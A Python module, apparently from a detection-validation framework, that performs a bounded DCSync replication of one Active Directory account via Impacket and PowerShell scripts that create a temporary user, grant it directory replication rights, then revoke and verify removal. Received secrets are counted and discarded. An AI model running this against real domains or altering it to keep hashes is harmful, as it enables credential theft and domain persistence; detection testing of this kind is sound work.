"""Bounded DRSUAPI replication used to validate the DC's DCSync detections.

The executor asks for exactly one named account, never writes an output file and
replaces Impacket's normal secret-printing callback with a counter. Credential
material exists only inside Impacket while it decodes the reply; it is neither
printed nor returned in the Result/ledger.
"""
import re
import secrets
import time
from datetime import datetime, timezone

from executors.registry import register
from result import make_result

_ACCOUNT = re.compile(r"^[A-Za-z0-9_.@$-]{1,64}$")
_SID = re.compile(r"^S-1-5-21-(?:\d+-){3}\d+$")
EPHEMERAL_ATTACK_MARKER = "ZYBUR_EPHEMERAL_DCSYNC_READY"
EPHEMERAL_CLEANUP_MARKER = "ZYBUR_EPHEMERAL_DCSYNC_CLEANUP_OK"
EPHEMERAL_PROBE_MARKER = "ZYBUR_EPHEMERAL_DCSYNC_PROBE_CLEAN"
EPHEMERAL_CLEANUP_ATTEMPTS = 3
EPHEMERAL_CLEANUP_RETRY_DELAY_S = 1.0


def _now():
    return datetime.now(timezone.utc).isoformat()


def run_dcsync(cfg, account, smb_cls=None, remote_ops_cls=None, ntds_cls=None):
    """Return the number of secrets received, retaining none of their values."""
    if cfg.get("target") != "domain_controller":
        raise ValueError("DCSync executor requires target: domain_controller")
    if not _ACCOUNT.fullmatch(str(account or "")):
        raise ValueError("DCSync account must be a simple AD account name")
    if not cfg.get("win_pass"):
        raise ValueError("DC_PASS is not configured")

    if smb_cls is None:
        from impacket.smbconnection import SMBConnection as smb_cls
    if remote_ops_cls is None or ntds_cls is None:
        from impacket.examples.secretsdump import RemoteOperations, NTDSHashes
        remote_ops_cls = remote_ops_cls or RemoteOperations
        ntds_cls = ntds_cls or NTDSHashes

    smb = remote = ntds = None
    received = 0

    def discard(_secret_type, _secret):
        nonlocal received
        received += 1

    try:
        # remoteName supplies the SPN/name Impacket expects; remoteHost pins the
        # network destination to the lab address and avoids accidental DNS drift.
        remote_name = cfg.get("dc_fqdn") or cfg["win_host"]
        smb = smb_cls(remote_name, cfg["win_host"], sess_port=445)
        smb.login(cfg["win_user"], cfg["win_pass"], cfg.get("dc_domain") or "")
        remote = remote_ops_cls(smb, False)
        remote.setExecMethod("smbexec")
        ntds = ntds_cls(
            None, None, isRemote=True, remoteOps=remote, useVSSMethod=False,
            justNTLM=True, justUser=account, outputFileName=None,
            perSecretCallback=discard,
        )
        ntds.dump()
        if received < 1:
            raise RuntimeError("DRSUAPI returned no matching account")
        return received
    finally:
        # DRSUAPI mode creates no remote service or snapshot, but it does hold RPC
        # handles. Close each independently so one cleanup failure cannot strand
        # the others.
        for obj, method in ((ntds, "finish"), (remote, "finish"), (smb, "logoff")):
            if obj is not None:
                try:
                    getattr(obj, method)()
                except Exception:
                    pass


def _text(response, field):
    return (getattr(response, field, b"") or b"").decode("utf-8", "replace").strip()


def _ephemeral_scripts(token, password, sid=None):
    """Build fixed-purpose account/right setup and cleanup scripts.

    The random password is transported only inside the encrypted WinRM request.
    No generated script, response, Result, or ledger row is persisted by this
    executor.
    """
    name = f"zv-dcs-{token}"
    owner = f"Zybur AD validation:first_time_dcsync:{token}"
    rights = (
        "1131f6aa-9c07-11d1-f79f-00c04fc2dcd2",
        "1131f6ad-9c07-11d1-f79f-00c04fc2dcd2",
        "89e95b76-444d-4c62-991a-0facbeda640c",
    )
    rights_ps = ",\n    ".join(f"'{guid}'" for guid in rights)
    common = f"""$ErrorActionPreference = 'Stop'
Import-Module ActiveDirectory -ErrorAction Stop
$name = '{name}'
$owner = '{owner}'
$domain = Get-ADDomain -ErrorAction Stop
$path = 'AD:' + $domain.DistinguishedName
$rightGuids = @(
    {rights_ps})
function Get-OwnedUser {{
  $u = Get-ADUser -LDAPFilter '(cn={name})' -Properties Description -ErrorAction Stop
  if ($null -ne $u -and $u.Description -ne $owner) {{
    throw 'refusing to touch a pre-existing AD user with the validation name'
  }}
  return $u
}}
""".strip()
    attack = f"""{common}
if ($null -ne (Get-OwnedUser)) {{ throw 'ephemeral DCSync user unexpectedly already exists' }}
$secure = ConvertTo-SecureString '{password}' -AsPlainText -Force
$u = New-ADUser -Name $name -SamAccountName $name -Description $owner -Enabled $true -AccountPassword $secure -PassThru -ErrorAction Stop
$acl = Get-Acl -Path $path -ErrorAction Stop
foreach ($right in $rightGuids) {{
  $ace = [System.DirectoryServices.ActiveDirectoryAccessRule]::new(
    $u.SID, [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
    [System.Security.AccessControl.AccessControlType]::Allow, [guid]$right)
  $acl.AddAccessRule($ace)
}}
Set-Acl -Path $path -AclObject $acl -ErrorAction Stop
Write-Output ('{EPHEMERAL_ATTACK_MARKER}:' + $u.SID.Value)
""".strip()
    cleanup = f"""{common}
$u = Get-OwnedUser
$sidText = '{sid or ''}'
if ($null -ne $u) {{ $sidText = $u.SID.Value }}
if ($sidText) {{
  $accountSid = [System.Security.Principal.SecurityIdentifier]::new($sidText)
  $acl = Get-Acl -Path $path -ErrorAction Stop
  foreach ($right in $rightGuids) {{
    $ace = [System.DirectoryServices.ActiveDirectoryAccessRule]::new(
      $accountSid, [System.DirectoryServices.ActiveDirectoryRights]::ExtendedRight,
      [System.Security.AccessControl.AccessControlType]::Allow, [guid]$right)
    $acl.RemoveAccessRuleSpecific($ace)
  }}
  Set-Acl -Path $path -AclObject $acl -ErrorAction Stop
  $check = Get-Acl -Path $path -ErrorAction Stop
  $remaining = @($check.Access | Where-Object {{
    try {{ $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value -eq $sidText }}
    catch {{ $_.IdentityReference.Value -eq $sidText }}
  }} | Where-Object {{ $rightGuids -contains $_.ObjectType.ToString() }})
  if ($remaining.Count -gt 0) {{ throw 'replication right cleanup was not proven' }}
}}
if ($null -ne $u) {{ Remove-ADUser -Identity $u -Confirm:$false -ErrorAction Stop }}
Write-Output ('{EPHEMERAL_CLEANUP_MARKER}:' + $sidText)
""".strip()
    probe = f"""{common}
$u = Get-OwnedUser
if ($null -ne $u) {{ Write-Output 'ZYBUR_EPHEMERAL_DCSYNC_RESIDUAL:user:{name}' }}
else {{
  $sidText = '{sid or ''}'
  $acl = Get-Acl -Path $path -ErrorAction Stop
  $remaining = @($acl.Access | Where-Object {{
    try {{ $_.IdentityReference.Translate([System.Security.Principal.SecurityIdentifier]).Value -eq $sidText }}
    catch {{ $_.IdentityReference.Value -eq $sidText }}
  }} | Where-Object {{ $rightGuids -contains $_.ObjectType.ToString() }})
  if ($sidText -and $remaining.Count -gt 0) {{ Write-Output 'ZYBUR_EPHEMERAL_DCSYNC_RESIDUAL:rights' }}
  else {{ Write-Output '{EPHEMERAL_PROBE_MARKER}' }}
}}
""".strip()
    return name, attack, cleanup, probe


def _marker_sid(text, marker):
    for line in text.splitlines():
        if line.startswith(marker + ":"):
            candidate = line.split(":", 1)[1].strip()
            if not candidate:
                return None
            if not _SID.fullmatch(candidate):
                raise RuntimeError("ephemeral DCSync returned an invalid SID marker")
            return candidate
    return None


def run_ephemeral_dcsync(cfg, account, session_factory, dcsync_fn=run_dcsync,
                         token=None, password=None, sleep_fn=time.sleep):
    """DCSync one account, then prove cleanup with bounded fresh-session retries."""
    if cfg.get("target") != "domain_controller":
        raise ValueError("ephemeral DCSync executor requires target: domain_controller")
    token = token or secrets.token_hex(4)
    if not re.fullmatch(r"[0-9a-f]{8}", token):
        raise ValueError("ephemeral DCSync token must be eight lowercase hex characters")
    password = password or ("Zy!" + secrets.token_hex(12) + "aA9")
    name, attack_ps, cleanup_ps, _ = _ephemeral_scripts(token, password)
    attack_error = None
    sid = None
    try:
        response = session_factory().run_ps(attack_ps)
        stdout, stderr = _text(response, "std_out"), _text(response, "std_err")
        sid = _marker_sid(stdout, EPHEMERAL_ATTACK_MARKER)
        if getattr(response, "status_code", 1) != 0:
            attack_error = f"ephemeral DCSync setup exited {response.status_code}: {stderr or 'no error text'}"
        elif sid is None:
            attack_error = "ephemeral DCSync setup returned no SID marker"
        else:
            attack_cfg = dict(cfg, win_user=name, win_pass=password)
            dcsync_fn(attack_cfg, account)
    except Exception as exc:
        attack_error = f"ephemeral DCSync failed: {type(exc).__name__}: {exc}"

    cleanup_error = probe_error = None
    cleanup_proven = False
    for attempt in range(1, EPHEMERAL_CLEANUP_ATTEMPTS + 1):
        cleanup_error = None
        try:
            _, _, cleanup_ps, _ = _ephemeral_scripts(token, password, sid=sid)
            response = session_factory().run_ps(cleanup_ps)
            stdout, stderr = _text(response, "std_out"), _text(response, "std_err")
            cleanup_sid = _marker_sid(stdout, EPHEMERAL_CLEANUP_MARKER)
            sid = sid or cleanup_sid
            if (getattr(response, "status_code", 1) != 0
                    or EPHEMERAL_CLEANUP_MARKER not in stdout):
                cleanup_error = (
                    "ephemeral DCSync cleanup was not proven: "
                    f"{stderr or 'no cleanup marker'}"
                )
        except Exception as exc:
            cleanup_error = (
                f"ephemeral DCSync cleanup failed: {type(exc).__name__}: {exc}"
            )

        probe_error = None
        try:
            _, _, _, probe_ps = _ephemeral_scripts(token, password, sid=sid)
            response = session_factory().run_ps(probe_ps)
            stdout, stderr = _text(response, "std_out"), _text(response, "std_err")
            if getattr(response, "status_code", 1) != 0:
                probe_error = (
                    f"ephemeral DCSync probe exited {response.status_code}: "
                    f"{stderr or 'no error text'}"
                )
            elif stdout.strip() != EPHEMERAL_PROBE_MARKER:
                probe_error = (
                    "ephemeral DCSync probe found residual state: "
                    f"{stdout or 'empty response'}"
                )
        except Exception as exc:
            probe_error = (
                f"ephemeral DCSync cleanup probe failed: {type(exc).__name__}: {exc}"
            )

        if cleanup_error is None and probe_error is None:
            cleanup_proven = True
            break
        if attempt < EPHEMERAL_CLEANUP_ATTEMPTS:
            sleep_fn(EPHEMERAL_CLEANUP_RETRY_DELAY_S)

    if not cleanup_proven:
        errors = [x for x in (cleanup_error, probe_error) if x]
        detail = "; ".join(errors).replace(password, "[REDACTED]")
        raise RuntimeError(
            f"ephemeral DCSync cleanup was not proven after "
            f"{EPHEMERAL_CLEANUP_ATTEMPTS} attempts: {detail}"
        )
    if attack_error:
        raise RuntimeError(attack_error.replace(password, "[REDACTED]"))
    return "novel principal DRSUAPI completed; response discarded and DACL cleanup independently proven"


@register("dcsync")
def dcsync(usecase, ctx):
    start = _now()
    try:
        count = run_dcsync(ctx.cfg or {}, (usecase.get("params") or {}).get("account"))
        return make_result(
            usecase, "SUCCESS", True, attack_start=start, attack_end=_now(),
            output=f"DRSUAPI completed for one account; {count} response value(s) discarded",
        )
    except Exception as exc:
        # Never let an exception echo a credential into the ledger. The class plus
        # a scrubbed message is enough to distinguish auth, transport and lookup.
        msg = str(exc)
        password = str((ctx.cfg or {}).get("win_pass") or "")
        if password:
            msg = msg.replace(password, "[REDACTED]")
        return make_result(
            usecase, f"ERROR: {type(exc).__name__}: {msg}", False,
            attack_start=start, attack_end=_now(),
        )


@register("dcsync_ephemeral")
def dcsync_ephemeral(usecase, ctx):
    start = _now()
    try:
        summary = run_ephemeral_dcsync(
            ctx.cfg or {}, (usecase.get("params") or {}).get("account"),
            ctx.winrm_factory,
        )
        return make_result(
            usecase, "SUCCESS", True, attack_start=start, attack_end=_now(), output=summary,
        )
    except Exception as exc:
        msg = str(exc)
        for secret in ((ctx.cfg or {}).get("win_pass"), (ctx.cfg or {}).get("dc_pass")):
            if secret:
                msg = msg.replace(str(secret), "[REDACTED]")
        return make_result(
            usecase, f"ERROR: {type(exc).__name__}: {msg}", False,
            attack_start=start, attack_end=_now(),
        )
